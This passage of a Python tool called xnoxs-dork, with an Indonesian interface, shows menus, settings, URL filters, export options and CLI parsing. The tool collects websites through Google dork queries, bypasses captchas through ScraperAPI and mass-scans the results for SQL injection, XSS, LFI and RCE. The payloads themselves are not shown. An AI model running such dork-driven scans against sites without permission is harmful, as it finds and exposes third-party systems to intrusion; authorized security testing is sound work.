    {Fore.WHITE}│ Impact    :{Style.RESET_ALL} {Fore.RED}{Back.WHITE} FULL SERVER COMPROMISE {Style.RESET_ALL}
    {Fore.RED}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
        
        print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}TIP:{Fore.WHITE} Gunakan menu Export untuk menyimpan hasil ke JSON/CSV{Fore.CYAN}        ║
    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
    
    input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")


def menu_filter_settings():
    """Menu for advanced URL filter settings."""
    while True:
        clear_screen()
        print_banner()
        
        filter_status = f"{Fore.GREEN}ENABLED" if settings['filter_enabled'] else f"{Fore.RED}DISABLED"
        active_categories = len(settings['filter_categories'])
        total_categories = len(DOMAIN_CATEGORIES)
        
        total_domains = sum(len(cat['domains']) for cat in DOMAIN_CATEGORIES.values())
        total_patterns = sum(len(cat['patterns']) for cat in DOMAIN_CATEGORIES.values())
        
        print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}◆  ADVANCED URL FILTER SETTINGS{Fore.CYAN}                                   ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║                                                                    ║
    ║  {Fore.WHITE}Filter Status: {filter_status}{' '*(51 - (7 if settings['filter_enabled'] else 8))}{Fore.CYAN}║
    ║  {Fore.WHITE}Active Categories: {Fore.YELLOW}{active_categories}/{total_categories}{Fore.WHITE}   Total Domains: {Fore.YELLOW}{total_domains}{Fore.WHITE}   Patterns: {Fore.YELLOW}{total_patterns}{' '*5}{Fore.CYAN}║
    ║                                                                    ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.YELLOW}[1]{Fore.WHITE} Toggle Filter (ON/OFF)                                       {Fore.CYAN}║
    ║  {Fore.YELLOW}[2]{Fore.WHITE} Manage Filter Categories                                     {Fore.CYAN}║
    ║  {Fore.YELLOW}[3]{Fore.WHITE} Add Custom Domain/Pattern Exclusion                          {Fore.CYAN}║
    ║  {Fore.YELLOW}[4]{Fore.WHITE} Manage Whitelist                                             {Fore.CYAN}║
    ║  {Fore.YELLOW}[5]{Fore.WHITE} View Current Filter Settings                                 {Fore.CYAN}║
    ║  {Fore.YELLOW}[6]{Fore.WHITE} Load Filter Config from File                                 {Fore.CYAN}║
    ║  {Fore.YELLOW}[7]{Fore.WHITE} Save Filter Config to File                                   {Fore.CYAN}║
    ║  {Fore.YELLOW}[8]{Fore.WHITE} Reset to Default Settings                                    {Fore.CYAN}║
    ║                                                                    ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.YELLOW}[0]{Fore.WHITE} Kembali                                                      {Fore.CYAN}║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
        
        choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih opsi: ").strip()
        
        if choice == '1':
            settings['filter_enabled'] = not settings['filter_enabled']
            status = "ENABLED" if settings['filter_enabled'] else "DISABLED"
            print_success(f"URL Filter sekarang {status}")
            time.sleep(1)
        
        elif choice == '2':
            menu_filter_categories()
        
        elif choice == '3':
            menu_add_custom_exclusion()
        
        elif choice == '4':
            menu_manage_whitelist()
        
        elif choice == '5':
            show_filter_settings()
            input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        
        elif choice == '6':
            filepath = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Path file config (default: filter_config.json): ").strip()
            if not filepath:
                filepath = 'filter_config.json'
            if load_filter_config(filepath):
                print_success(f"Filter config loaded dari {filepath}")
            else:
                print_error("Gagal memuat filter config")
            time.sleep(1.5)
        
        elif choice == '7':
            filepath = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Path file config (default: filter_config.json): ").strip()
            if not filepath:
                filepath = 'filter_config.json'
            if save_filter_config(filepath):
                print_success(f"Filter config disimpan ke {filepath}")
            else:
                print_error("Gagal menyimpan filter config")
            time.sleep(1.5)
        
        elif choice == '8':
            settings['filter_categories'] = ['code_repos', 'forums', 'docs', 'social', 'search_engines', 'cdn']
            CUSTOM_EXCLUDED_DOMAINS.clear()
            CUSTOM_EXCLUDED_PATTERNS.clear()
            WHITELISTED_DOMAINS.clear()
            print_success("Filter settings direset ke default!")
            time.sleep(1)
        
        elif choice == '0':
            break


def menu_filter_categories():
    """Menu to manage filter categories."""
    while True:
        clear_screen()
        print_banner()
        
        print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}◆  MANAGE FILTER CATEGORIES{Fore.CYAN}                                       ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.WHITE}Pilih kategori untuk toggle ON/OFF:{' '*32}{Fore.CYAN}║
    ╠════════════════════════════════════════════════════════════════════╣""")
        
        categories = list(DOMAIN_CATEGORIES.keys())
        for i, category in enumerate(categories, 1):
            data = DOMAIN_CATEGORIES[category]
            status = f"{Fore.GREEN}[ON] " if category in settings['filter_categories'] else f"{Fore.RED}[OFF]"
            domain_count = len(data['domains'])
            pattern_count = len(data['patterns'])
            name = data['name'][:30]
            print(f"    {Fore.CYAN}║  {Fore.YELLOW}[{i}]{Style.RESET_ALL} {status} {name:<30} ({domain_count} domains, {pattern_count} patterns){' '*(4)}{Fore.CYAN}║")
        
        print(f"""    {Fore.CYAN}╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.YELLOW}[A]{Fore.WHITE} Aktifkan Semua                                              {Fore.CYAN}║
    ║  {Fore.YELLOW}[N]{Fore.WHITE} Nonaktifkan Semua                                           {Fore.CYAN}║
    ║  {Fore.YELLOW}[0]{Fore.WHITE} Kembali                                                     {Fore.CYAN}║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
        
        choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih opsi: ").strip().upper()
        
        if choice == '0':
            break
        elif choice == 'A':
            settings['filter_categories'] = list(DOMAIN_CATEGORIES.keys())
            print_success("Semua kategori diaktifkan!")
            time.sleep(1)
        elif choice == 'N':
            settings['filter_categories'] = []
            print_success("Semua kategori dinonaktifkan!")
            time.sleep(1)
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(categories):
                    category = categories[idx]
                    if toggle_filter_category(category):
                        print_success(f"Kategori '{DOMAIN_CATEGORIES[category]['name']}' diaktifkan")
                    else:
                        print_warning(f"Kategori '{DOMAIN_CATEGORIES[category]['name']}' dinonaktifkan")
                    time.sleep(0.5)
            except ValueError:
                pass


def menu_add_custom_exclusion():
    """Menu to add custom domain or pattern exclusion."""
    clear_screen()
    print_banner()
    
    print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}◆  ADD CUSTOM EXCLUSION{Fore.CYAN}                                           ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║                                                                    ║
    ║  {Fore.YELLOW}[1]{Fore.WHITE} Tambah Domain (contoh: example.com)                         {Fore.CYAN}║
    ║  {Fore.YELLOW}[2]{Fore.WHITE} Tambah Pattern Regex (contoh: .*\\.edu$)                     {Fore.CYAN}║
    ║  {Fore.YELLOW}[3]{Fore.WHITE} Lihat Custom Exclusions                                     {Fore.CYAN}║
    ║  {Fore.YELLOW}[4]{Fore.WHITE} Hapus Custom Exclusion                                      {Fore.CYAN}║
    ║  {Fore.YELLOW}[0]{Fore.WHITE} Kembali                                                     {Fore.CYAN}║
    ║                                                                    ║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
    
    choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih opsi: ").strip()
    
    if choice == '1':
        domain = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Masukkan domain: ").strip().lower()
        if domain:
            if add_custom_exclusion(domain, is_pattern=False):
                print_success(f"Domain '{domain}' ditambahkan ke exclusion list")
            else:
                print_warning(f"Domain '{domain}' sudah ada di exclusion list")
        time.sleep(1.5)
    
    elif choice == '2':
        pattern = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Masukkan regex pattern: ").strip()
        if pattern:
            try:
                re.compile(pattern)
                if add_custom_exclusion(pattern, is_pattern=True):
                    print_success(f"Pattern '{pattern}' ditambahkan ke exclusion list")
                else:
                    print_warning(f"Pattern '{pattern}' sudah ada di exclusion list")
            except re.error:
                print_error("Pattern regex tidak valid!")
        time.sleep(1.5)
    
    elif choice == '3':
        print(f"\n    {Fore.CYAN}Custom Excluded Domains:{Style.RESET_ALL}")
        if CUSTOM_EXCLUDED_DOMAINS:
            for d in CUSTOM_EXCLUDED_DOMAINS:
                print(f"      • {d}")
        else:
            print(f"      {Fore.WHITE}(kosong){Style.RESET_ALL}")
        
        print(f"\n    {Fore.CYAN}Custom Excluded Patterns:{Style.RESET_ALL}")
        if CUSTOM_EXCLUDED_PATTERNS:
            for p in CUSTOM_EXCLUDED_PATTERNS:
                print(f"      • {p}")
        else:
            print(f"      {Fore.WHITE}(kosong){Style.RESET_ALL}")
        
        input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
    
    elif choice == '4':
        print(f"\n    {Fore.CYAN}[1]{Style.RESET_ALL} Hapus domain")
        print(f"    {Fore.CYAN}[2]{Style.RESET_ALL} Hapus pattern")
        sub = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih: ").strip()
        
        if sub == '1' and CUSTOM_EXCLUDED_DOMAINS:
            for i, d in enumerate(CUSTOM_EXCLUDED_DOMAINS, 1):
                print(f"      [{i}] {d}")
            try:
                idx = int(input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Nomor domain: ")) - 1
                if 0 <= idx < len(CUSTOM_EXCLUDED_DOMAINS):
                    removed = CUSTOM_EXCLUDED_DOMAINS.pop(idx)
                    print_success(f"Domain '{removed}' dihapus")
            except (ValueError, IndexError):
                print_error("Nomor tidak valid")
        elif sub == '2' and CUSTOM_EXCLUDED_PATTERNS:
            for i, p in enumerate(CUSTOM_EXCLUDED_PATTERNS, 1):
                print(f"      [{i}] {p}")
            try:
                idx = int(input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Nomor pattern: ")) - 1
                if 0 <= idx < len(CUSTOM_EXCLUDED_PATTERNS):
                    removed = CUSTOM_EXCLUDED_PATTERNS.pop(idx)
                    print_success(f"Pattern '{removed}' dihapus")
            except (ValueError, IndexError):
                print_error("Nomor tidak valid")
        time.sleep(1.5)


def menu_manage_whitelist():
    """Menu to manage whitelisted domains."""
    while True:
        clear_screen()
        print_banner()
        
        print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}◆  MANAGE WHITELIST{Fore.CYAN}                                               ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.WHITE}Domain di whitelist tidak akan di-filter meski masuk kategori{' '*4}{Fore.CYAN}║
    ╠════════════════════════════════════════════════════════════════════╣
    ║                                                                    ║
    ║  {Fore.YELLOW}[1]{Fore.WHITE} Tambah Domain ke Whitelist                                  {Fore.CYAN}║
    ║  {Fore.YELLOW}[2]{Fore.WHITE} Lihat Whitelist                                             {Fore.CYAN}║
    ║  {Fore.YELLOW}[3]{Fore.WHITE} Hapus dari Whitelist                                        {Fore.CYAN}║
    ║  {Fore.YELLOW}[0]{Fore.WHITE} Kembali                                                     {Fore.CYAN}║
    ║                                                                    ║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
        
        choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih opsi: ").strip()
        
        if choice == '1':
            domain = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Masukkan domain: ").strip().lower()
            if domain:
                if add_whitelist(domain):
                    print_success(f"Domain '{domain}' ditambahkan ke whitelist")
                else:
                    print_warning(f"Domain '{domain}' sudah ada di whitelist")
            time.sleep(1.5)
        
        elif choice == '2':
            print(f"\n    {Fore.CYAN}Whitelisted Domains:{Style.RESET_ALL}")
            if WHITELISTED_DOMAINS:
                for d in WHITELISTED_DOMAINS:
                    print(f"      • {d}")
            else:
                print(f"      {Fore.WHITE}(kosong){Style.RESET_ALL}")
            input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        
        elif choice == '3':
            if WHITELISTED_DOMAINS:
                for i, d in enumerate(WHITELISTED_DOMAINS, 1):
                    print(f"      [{i}] {d}")
                try:
                    idx = int(input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Nomor domain: ")) - 1
                    if 0 <= idx < len(WHITELISTED_DOMAINS):
                        removed = WHITELISTED_DOMAINS.pop(idx)
                        print_success(f"Domain '{removed}' dihapus dari whitelist")
                except (ValueError, IndexError):
                    print_error("Nomor tidak valid")
            else:
                print_warning("Whitelist kosong")
            time.sleep(1.5)
        
        elif choice == '0':
            break


def menu_settings():
    while True:
        clear_screen()
        print_banner()
        
        api_status = f"{Fore.GREEN}Active"
        filter_status = f"{Fore.GREEN}ON" if settings['filter_enabled'] else f"{Fore.RED}OFF"
        
        print(f"""
    {Fore.CYAN}┌────────────────────────────────────────────────────────────────────┐
    │  {Fore.YELLOW}◆  PENGATURAN{Fore.CYAN}                                                     │
    ├────────────────────────────────────────────────────────────────────┤
    │                                                                    │
    │  {Fore.YELLOW}[1]{Fore.WHITE} Jumlah Hasil Pencarian  : {Fore.GREEN}{settings['num_results']:<35}{Fore.CYAN} │
    │  {Fore.YELLOW}[2]{Fore.WHITE} Request Timeout (detik) : {Fore.GREEN}{settings['timeout']:<35}{Fore.CYAN} │
    │  {Fore.YELLOW}[3]{Fore.WHITE} Jumlah Thread           : {Fore.GREEN}{settings['threads']:<35}{Fore.CYAN} │
    │  {Fore.YELLOW}[4]{Fore.WHITE} Advanced URL Filter     : {filter_status:<43}{Fore.CYAN} │
    │                                                                    │
    ├────────────────────────────────────────────────────────────────────┤
    │  {Fore.MAGENTA}ScraperAPI Status: {api_status}{' '*40}{Fore.CYAN} │
    ├────────────────────────────────────────────────────────────────────┤
    │  {Fore.YELLOW}[0]{Fore.WHITE} Kembali ke Menu Utama                                        {Fore.CYAN} │
    └────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
        
        choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih opsi: ").strip()
        
        if choice == '1':
            try:
                num = int(input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Jumlah hasil (1-100): "))
                if 1 <= num <= 100:
                    settings['num_results'] = num
                    print_success("Pengaturan disimpan!")
                else:
                    print_error("Nilai harus antara 1-100")
            except ValueError:
                print_error("Masukkan angka yang valid!")
            time.sleep(1)
        
        elif choice == '2':
            try:
                timeout = int(input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Timeout (5-60 detik): "))
                if 5 <= timeout <= 60:
                    settings['timeout'] = timeout
                    print_success("Pengaturan disimpan!")
                else:
                    print_error("Nilai harus antara 5-60")
            except ValueError:
                print_error("Masukkan angka yang valid!")
            time.sleep(1)
        
        elif choice == '3':
            try:
                threads = int(input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Jumlah thread (1-20): "))
                if 1 <= threads <= 20:
                    settings['threads'] = threads
                    print_success("Pengaturan disimpan!")
                else:
                    print_error("Nilai harus antara 1-20")
            except ValueError:
                print_error("Masukkan angka yang valid!")
            time.sleep(1)
        
        elif choice == '4':
            menu_filter_settings()
        
        elif choice == '0':
            break


def menu_file_scan():
    clear_screen()
    print_banner()
    
    print(f"""
    {Fore.CYAN}┌────────────────────────────────────────────────────────────────────┐
    │  {Fore.YELLOW}◆  SCAN URL DARI FILE{Fore.CYAN}                                            │
    └────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
    
    print(f"    {Fore.WHITE}Format file (satu URL per baris):{Style.RESET_ALL}")
    print(f"    {Fore.GREEN}•{Style.RESET_ALL} http://example.com/page.php?id=1")
    print(f"    {Fore.GREEN}•{Style.RESET_ALL} http://example.com/product.php?cat=5")
    print(f"    {Fore.GREEN}•{Style.RESET_ALL} # Baris dengan # akan diabaikan")
    print()
    
    filepath = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Masukkan path file: ").strip()
    
    if not filepath:
        print_error("Path file tidak boleh kosong!")
        input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        return
    
    urls = import_urls_from_file(filepath)
    
    if urls is None:
        print_error(f"File tidak ditemukan: {filepath}")
        input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        return
    
    if not urls:
        print_error("File kosong atau tidak ada URL valid!")
        input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        return
    
    print_divider()
    print_success(f"Ditemukan {Fore.YELLOW}{len(urls)}{Style.RESET_ALL} URL dari file")
    print_info(f"Memulai scan dengan {Fore.GREEN}{settings['threads']} threads{Style.RESET_ALL}")
    print()
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    results = multi_threaded_scan(urls, settings['timeout'], settings['threads'])
    
    print_divider()
    blind_vulns = results.get('blind_vulns', 0)
    total_vulns = results['sql_vulns'] + blind_vulns + results['xss_vulns'] + results['dom_vulns']
    print(f"""
    {Fore.CYAN}╔{'═'*66}╗
    ║{Fore.GREEN}                      SCAN SELESAI                               {Fore.CYAN}║
    ╠{'═'*66}╣
    ║{Fore.WHITE}  Total URL di-scan    : {Fore.YELLOW}{len(urls):<40}{Fore.CYAN}║
    ║{Fore.WHITE}  SQL Injection Found  : {Fore.RED if results['sql_vulns'] > 0 else Fore.GREEN}{results['sql_vulns']:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  Blind SQLi Found     : {Fore.RED if blind_vulns > 0 else Fore.GREEN}{blind_vulns:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  Reflected XSS Found  : {Fore.MAGENTA if results['xss_vulns'] > 0 else Fore.GREEN}{results['xss_vulns']:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  DOM-based XSS Found  : {Fore.YELLOW if results['dom_vulns'] > 0 else Fore.GREEN}{results['dom_vulns']:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  Total Vulnerability  : {Fore.RED if total_vulns > 0 else Fore.GREEN}{total_vulns:<40}{Fore.CYAN}║
    ╚{'═'*66}╝{Style.RESET_ALL}
""")
    
    input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")


def menu_export():
    clear_screen()
    print_banner()
    
    total_vulns = (len(all_vulnerabilities) + len(all_blind_sqli_vulnerabilities) + 
                   len(all_xss_vulnerabilities) + len(all_dom_xss_vulnerabilities))
    
    print(f"""
    {Fore.CYAN}┌────────────────────────────────────────────────────────────────────┐
    │  {Fore.YELLOW}◆  EXPORT HASIL{Fore.CYAN}                                                   │
    ├────────────────────────────────────────────────────────────────────┤
    │                                                                    │
    │  {Fore.WHITE}Total vulnerability ditemukan: {Fore.YELLOW}{total_vulns:<32}{Fore.CYAN}│
    │                                                                    │
    │  {Fore.YELLOW}[1]{Fore.WHITE} ◆  Export ke JSON                                          {Fore.CYAN}│
    │  {Fore.YELLOW}[2]{Fore.WHITE} ◆  Export ke CSV                                           {Fore.CYAN}│
    │  {Fore.YELLOW}[3]{Fore.WHITE} ◆  Export ke HTML Report                                   {Fore.CYAN}│
    │  {Fore.YELLOW}[0]{Fore.WHITE} ◆  Kembali                                                 {Fore.CYAN}│
    │                                                                    │
    └────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
    
    if total_vulns == 0:
        print_warning("Belum ada hasil vulnerability untuk di-export.")
        print_info("Lakukan scan terlebih dahulu.")
        input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        return
    
    choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih format: ").strip()
    
    if choice == '1':
        filename = export_to_json()
        print_success(f"Hasil di-export ke: {Fore.YELLOW}{filename}{Style.RESET_ALL}")
    elif choice == '2':
        filename = export_to_csv()
        print_success(f"Hasil di-export ke: {Fore.YELLOW}{filename}{Style.RESET_ALL}")
    elif choice == '3':
        filename = export_to_html()
        print_success(f"Hasil di-export ke: {Fore.YELLOW}{filename}{Style.RESET_ALL}")
    elif choice == '0':
        return
    else:
        print_error("Pilihan tidak valid!")
    
    input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")


def menu_about():
    clear_screen()
    print_banner()
    
    print(f"""
    {Fore.CYAN}┌────────────────────────────────────────────────────────────────────┐
    │  {Fore.YELLOW}◆  TENTANG XNOXS-DORK{Fore.CYAN}                                             │
    ├────────────────────────────────────────────────────────────────────┤
    │                                                                    │
    │  {Fore.WHITE}xnoxs-dork adalah tool untuk mendeteksi kerentanan SQL{Fore.CYAN}            │
    │  {Fore.WHITE}Injection dan XSS pada website. Tool ini melakukan:{Fore.CYAN}               │
    │                                                                    │
    │  {Fore.GREEN}•{Fore.WHITE} Pencarian Google menggunakan dork query{Fore.CYAN}                         │
    │  {Fore.GREEN}•{Fore.WHITE} Multi-threaded scanning untuk performa lebih cepat{Fore.CYAN}              │
    │  {Fore.GREEN}•{Fore.WHITE} Scan SQL Injection (Error-based & Blind){Fore.CYAN}                        │
    │  {Fore.GREEN}•{Fore.WHITE} Scan Reflected XSS dengan multiple payload{Fore.CYAN}                      │
    │  {Fore.GREEN}•{Fore.WHITE} Scan DOM-based XSS (source & sink analysis){Fore.CYAN}                     │
    │  {Fore.GREEN}•{Fore.WHITE} Import URL dari file & Export hasil{Fore.CYAN}                             │
    │  {Fore.GREEN}•{Fore.WHITE} Bypass captcha Google dengan ScraperAPI{Fore.CYAN}                         │
    │                                                                    │
    ├────────────────────────────────────────────────────────────────────┤
    │  {Fore.RED}DISCLAIMER:{Fore.CYAN}                                                       │
    │  {Fore.WHITE}Tool ini hanya untuk keperluan edukasi dan security research.{Fore.CYAN}     │
    │  {Fore.WHITE}Pastikan Anda memiliki izin sebelum melakukan testing.{Fore.CYAN}            │
    │                                                                    │
    ├────────────────────────────────────────────────────────────────────┤
    │  {Fore.MAGENTA}Version: {Fore.WHITE}3.0{Fore.CYAN}                                                      │
    │  {Fore.MAGENTA}Author:{Fore.WHITE}  xnoxs{Fore.CYAN}                                                    │
    │  {Fore.MAGENTA}GitHub:{Fore.WHITE}  github.com/developerxnoxs{Fore.CYAN}                                │
    └────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
    
    input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")


def run_cli_mode(args):
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    print_banner()
    
    if args.threads:
        settings['threads'] = args.threads
    if args.timeout:
        settings['timeout'] = args.timeout
    if args.results:
        settings['num_results'] = args.results
    
    urls = []
    
    if args.url:
        urls = [args.url if args.url.startswith(('http://', 'https://')) else 'http://' + args.url]
        print_info(f"Target: {Fore.YELLOW}{urls[0]}{Style.RESET_ALL}")
    
    elif args.file:
        urls = import_urls_from_file(args.file)
        if urls is None:
            print_error(f"File tidak ditemukan: {args.file}")
            sys.exit(1)
        if not urls:
            print_error("File kosong atau tidak ada URL valid!")
            sys.exit(1)
        print_success(f"Loaded {Fore.YELLOW}{len(urls)}{Style.RESET_ALL} URLs from file")
    
    elif args.dork:
        print_info(f"Dork: {Fore.YELLOW}{args.dork}{Style.RESET_ALL}")
        urls = search_dork(args.dork, settings['num_results'])
        if not urls:
            print_error("Tidak ada URL ditemukan dari dork!")
            sys.exit(1)
    
    if not urls:
        print_error("Tidak ada target URL! Gunakan --url, --file, atau --dork")
        sys.exit(1)
    
    print_divider()
    print_info(f"Scanning {len(urls)} URL dengan {settings['threads']} threads...")
    print()
    
    if len(urls) == 1:
        sql_vulns, blind_vulns, xss_vulns, dom_vulns, lfi_vulns, rce_vulns = scan_url(urls[0], settings['timeout'])
        results = {
            'sql_vulns': len(sql_vulns),
            'blind_vulns': len(blind_vulns),
            'xss_vulns': len(xss_vulns),
            'dom_vulns': len(dom_vulns),
            'lfi_vulns': len(lfi_vulns),
            'rce_vulns': len(rce_vulns)
        }
    else:
        results = multi_threaded_scan(urls, settings['timeout'], settings['threads'])
    
    print_divider()
    blind_vulns_count = results.get('blind_vulns', len(all_blind_sqli_vulnerabilities))
    lfi_vulns_count = results.get('lfi_vulns', len(all_lfi_vulnerabilities))
    rce_vulns_count = results.get('rce_vulns', len(all_rce_vulnerabilities))
    total_vulns = results['sql_vulns'] + blind_vulns_count + results['xss_vulns'] + results['dom_vulns'] + lfi_vulns_count + rce_vulns_count
    print_success(f"Scan selesai! Total: {Fore.RED}{total_vulns}{Style.RESET_ALL} vulnerability ditemukan")
    print_info(f"SQLi: {results['sql_vulns']}, Blind: {blind_vulns_count}, XSS: {results['xss_vulns']}, DOM: {results['dom_vulns']}, LFI: {lfi_vulns_count}, RCE: {rce_vulns_count}")
    
    if args.output:
        if args.output.endswith('.json'):
            filename = export_to_json(args.output)
        elif args.output.endswith('.csv'):
            filename = export_to_csv(args.output)
        elif args.output.endswith('.html'):
            filename = export_to_html(args.output)
        else:
            filename = export_to_json(args.output + '.json')
        print_success(f"Hasil di-export ke: {Fore.YELLOW}{filename}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description='XNOXS DORK - SQLi & XSS Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xnoxs_dork.py                              # Interactive mode
  python xnoxs_dork.py -u http://example.com/?id=1  # Scan single URL
  python xnoxs_dork.py -f urls.txt                  # Scan from file
  python xnoxs_dork.py -d "inurl:php?id="           # Scan with dork
  python xnoxs_dork.py -u http://example.com -o results.json
        """
    )
    
    parser.add_argument('-u', '--url', help='Single URL to scan')
    parser.add_argument('-f', '--file', help='File containing URLs (one per line)')
    parser.add_argument('-d', '--dork', help='Google dork query')
    parser.add_argument('-o', '--output', help='Output file (json/csv/html)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-r', '--results', type=int, default=100, help='Max results from dork (default: 100)')
    
    filter_group = parser.add_argument_group('URL Filter Options')
    filter_group.add_argument('--no-filter', action='store_true', help='Disable URL filtering')
    filter_group.add_argument('--filter-config', help='Load filter config from JSON file')
    filter_group.add_argument('--exclude-category', action='append', dest='exclude_cats', metavar='CAT',
                              help='Exclude filter category (code_repos, forums, docs, social, search_engines, cdn, security, pastebin)')
    filter_group.add_argument('--only-category', action='append', dest='only_cats', metavar='CAT',
                              help='Use only specific filter categories')
    filter_group.add_argument('--whitelist', action='append', dest='whitelist_domains',
                              help='Add domain to whitelist (will not be filtered)')
    filter_group.add_argument('--exclude-domain', action='append', dest='exclude_domains',
                              help='Add domain to exclusion list')
    filter_group.add_argument('--show-filter-stats', action='store_true', help='Show detailed filter statistics')
    
    args = parser.parse_args()
    
    if args.no_filter:
        settings['filter_enabled'] = False
    
    if args.filter_config:
        load_filter_config(args.filter_config)
    
    if args.exclude_cats:
        for cat in args.exclude_cats:
            if cat in settings['filter_categories']:
                settings['filter_categories'].remove(cat)
    
    if args.only_cats:
        settings['filter_categories'] = [cat for cat in args.only_cats if cat in DOMAIN_CATEGORIES]
    
    if args.whitelist_domains:
        for domain in args.whitelist_domains:
            add_whitelist(domain.lower())
    
    if args.exclude_domains:
        for domain in args.exclude_domains:
            add_custom_exclusion(domain.lower(), is_pattern=False)
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    if args.url or args.file or args.dork:
        run_cli_mode(args)
        return
    
    while True:
        clear_screen()
        print_banner()
        print_menu()
        
        choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih menu: ").strip()
        
        if choice == '1':
            menu_dork_scan()
        elif choice == '2':
            menu_single_url()
        elif choice == '3':
            menu_file_scan()
        elif choice == '4':
            menu_view_results()
        elif choice == '5':
            menu_export()
        elif choice == '6':
            menu_settings()
        elif choice == '7':
            menu_about()
        elif choice == '0':
            clear_screen()
            print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║                                                                    ║
    ║  {Fore.YELLOW}Terima kasih telah menggunakan xnoxs-dork!{Fore.CYAN}                       ║
    ║  {Fore.WHITE}Gunakan dengan bijak dan bertanggung jawab.{Fore.CYAN}                      ║
    ║                                                                    ║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
            sys.exit(0)
        else:
            print_error("Pilihan tidak valid!")
            time.sleep(1)


if __name__ == "__main__":
    main()
